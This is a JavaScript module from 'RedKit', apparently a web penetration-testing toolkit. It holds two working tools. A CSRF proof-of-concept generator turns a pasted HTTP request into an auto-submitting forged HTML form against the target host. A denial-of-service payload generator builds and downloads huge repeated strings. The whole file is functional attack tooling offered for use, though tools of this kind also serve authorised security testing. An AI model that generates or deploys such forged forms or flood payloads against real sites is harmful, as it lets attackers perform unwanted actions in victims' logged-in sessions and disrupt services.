// RedKit · payloads/generators.js (split from payloads.js)
/* ============================================================
   RedKit - Payloads & web exploitation tools
   Loaded after js/core.js (uses $, el, TOOLS, helpers).
   ============================================================ */

// ============================================================
// EXPLOITATION TOOLS
// ============================================================

// ===== CSRF POC CREATOR =====
TOOLS['csrf-poc'] = {
  title: 'CSRF PoC Generator',
  desc: 'Turn a raw HTTP request into a working CSRF proof-of-concept form.',
  render() {
    return `
      <div class="tool">
        ${card('Raw HTTP Request', `
          ${field('Paste the raw request (request line + headers + blank line + body)', `<textarea id="csrf-raw" rows="14" placeholder="POST /api/action HTTP/1.1&#10;Host: target.com&#10;Content-Type: application/x-www-form-urlencoded&#10;&#10;name=evil&email=attacker@example.com"></textarea>`)}
          <div class="field-row">
            ${field('Scheme', `<select id="csrf-scheme">
                <option value="https">HTTPS</option>
                <option value="http">HTTP</option>
              </select>`)}
            ${field('Submission', `<select id="csrf-submit">
                <option value="auto">Auto-submit</option>
                <option value="button">Require submit button</option>
              </select>`)}
          </div>
          <div class="btn-row">
            <button class="btn" id="csrf-gen">Generate</button>
          </div>
        `)}
        ${card('', resultHead('Generated PoC', `<div>${ghostBtn('csrf-copy')}${ghostBtn('csrf-dl', 'Download .html')}</div>`) +
          `<div class="result-box" id="csrf-output"></div>`, { id: 'csrf-results', hidden: true })}
      </div>
    `;
  },
  init() {
    const parseRaw = (raw) => {
      const norm = raw.replace(/\r\n/g, '\n').trim();
      if (!norm) throw new Error('Empty request');
      const sepIdx = norm.indexOf('\n\n');
      const headPart = sepIdx === -1 ? norm : norm.slice(0, sepIdx);
      const body = sepIdx === -1 ? '' : norm.slice(sepIdx + 2);
      const lines = headPart.split('\n');
      const reqLine = lines.shift();
      const m = reqLine.match(/^(\S+)\s+(\S+)\s+\S+/);
      if (!m) throw new Error('Invalid request line');
      const method = m[1].toUpperCase();
      const path = m[2];
      const headers = {};
      lines.forEach(l => {
        const i = l.indexOf(':');
        if (i === -1) return;
        headers[l.slice(0, i).trim().toLowerCase()] = l.slice(i + 1).trim();
      });
      return { method, path, headers, body };
    };

    const parseFormBody = (body) => {
      const out = [];
      body.split('&').forEach(p => {
        if (!p) return;
        const i = p.indexOf('=');
        const k = i === -1 ? p : p.slice(0, i);
        const v = i === -1 ? '' : p.slice(i + 1);
        try { out.push([decodeURIComponent(k.replace(/\+/g, ' ')), decodeURIComponent(v.replace(/\+/g, ' '))]); }
        catch { out.push([k, v]); }
      });
      return out;
    };

    const buildPoc = () => {
      const raw = $('#csrf-raw').value;
      const scheme = $('#csrf-scheme').value;
      const autoSubmit = $('#csrf-submit').value === 'auto';
      const req = parseRaw(raw);
      const host = req.headers['host'];
      if (!host) throw new Error('Missing Host header');

      // Split query string off the path so it doesn't end up in form action twice
      const qIdx = req.path.indexOf('?');
      const pathOnly = qIdx === -1 ? req.path : req.path.slice(0, qIdx);
      const queryStr = qIdx === -1 ? '' : req.path.slice(qIdx + 1);
      const url = `${scheme}://${host}${pathOnly}`;

      const ct = (req.headers['content-type'] || '').toLowerCase();
      let enctype = '';
      if (ct.includes('multipart/form-data')) enctype = ' enctype="multipart/form-data"';
      else if (ct.includes('text/plain')) enctype = ' enctype="text/plain"';
      else enctype = ' enctype="application/x-www-form-urlencoded"';

      // GET/HEAD: params come from the query string. Otherwise: from the body.
      const params = ['GET', 'HEAD'].includes(req.method)
        ? parseFormBody(queryStr)
        : parseFormBody(req.body);
      const inputs = params.map(([k, v]) => `    <input type="hidden" name="${escapeHtml(k)}" value="${escapeHtml(v)}">`).join('\n');

      const formMethod = req.method === 'GET' ? 'GET' : 'POST';
      const submitBtn = autoSubmit ? '' : '\n    <input type="submit" value="Submit request">';
      const autoScript = autoSubmit ? '\n  <script>document.getElementById("csrfForm").submit();</script>' : '';

      return `<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <form id="csrfForm" action="${escapeHtml(url)}" method="${formMethod}"${enctype}>
${inputs}${submitBtn}
  </form>${autoScript}
</body>
</html>`;
    };

    const showOut = (s) => {
      $('#csrf-output').textContent = s;
      $('#csrf-results').style.display = 'block';
    };

    $('#csrf-gen').addEventListener('click', () => {
      try { showOut(buildPoc()); }
      catch (e) { toast('Error: ' + e.message); }
    });
    wireCopy('csrf-copy', () => $('#csrf-output').textContent);
    $('#csrf-dl').addEventListener('click', () => download('csrf-poc.html', $('#csrf-output').textContent, 'text/html'));
  }
};

// ===== DOS PAYLOAD GENERATOR =====
TOOLS['dos-gen'] = {
  title: 'DoS Payload Generator',
  desc: 'Generate large repeated payloads to test input validation limits.',
  render() {
    return `
      <div class="tool">
        ${card('Payload Configuration', `
          ${field('Text input', `<input type="text" id="dos-text" value="a">`)}
          <div class="field-row-3">
            ${field('Repetition count', `<input type="number" id="dos-count" value="1000">`)}
            ${field('Separator (optional)', `<input type="text" id="dos-sep" placeholder="e.g. /">`)}
            ${field('Filename', `<input type="text" id="dos-file" value="payload.txt">`)}
          </div>
          <div class="btn-row">
            <button class="btn" id="dos-gen">Generate &amp; Download</button>
            <button class="btn btn-secondary" id="dos-preview">Preview</button>
          </div>
        `)}
        ${card('', resultHead(`Preview <span id="dos-size" style="color:var(--text-mute);font-weight:400;font-size:11px"></span>`, ghostBtn('dos-copy')) +
          `<div class="result-box" id="dos-output"></div>`, { id: 'dos-results', hidden: true })}
      </div>
    `;
  },
  init() {
    const build = () => {
      const text = $('#dos-text').value;
      const count = parseInt($('#dos-count').value) || 0;
      const sep = $('#dos-sep').value;
      if (!text || !count) { toast('Need text and count'); return null; }
      return Array(count).fill(text).join(sep);
    };
    $('#dos-gen').addEventListener('click', () => {
      const payload = build();
      if (payload == null) return;
      const file = $('#dos-file').value || 'payload.txt';
      download(file, payload);
      toast(`Generated ${payload.length} bytes`);
    });
    $('#dos-preview').addEventListener('click', () => {
      const payload = build();
      if (payload == null) return;
      const preview = payload.length > 5000 ? payload.slice(0, 5000) + '\n... [truncated]' : payload;
      $('#dos-output').textContent = preview;
      $('#dos-size').textContent = `(${payload.length.toLocaleString()} bytes)`;
      $('#dos-results').style.display = 'block';
    });
    $('#dos-copy').addEventListener('click', () => { const p = build(); if (p != null) copy(p); });
  }
};

